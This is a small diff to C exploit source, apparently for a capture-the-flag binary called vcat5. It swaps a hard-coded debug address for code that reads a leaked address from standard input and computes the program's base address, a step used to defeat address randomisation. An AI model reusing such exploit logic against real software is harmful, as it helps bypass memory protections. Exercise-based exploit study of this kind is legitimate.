@@ -83,12 +83,12 @@ main(int argc, char **argv)
 	memset(buf, 0, BUF_SZ);
 
 	/* leak the base address of `vcat5'	*/
-	// write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
-	// read(STDIN_FILENO, buf, BUF_SZ-1);
-	// baddr = strtoul(buf, NULL, 16) - LEAK_OFF;
+	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
+	read(STDIN_FILENO, buf, BUF_SZ-1);
+	baddr = strtoul(buf, NULL, 16) - LEAK_OFF;
 
 	// For debug only:
-	baddr = DEBUG_LEAK - LEAK_OFF;
+	//baddr = DEBUG_LEAK - LEAK_OFF;
 
 	/* sanity check 			*/
 	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
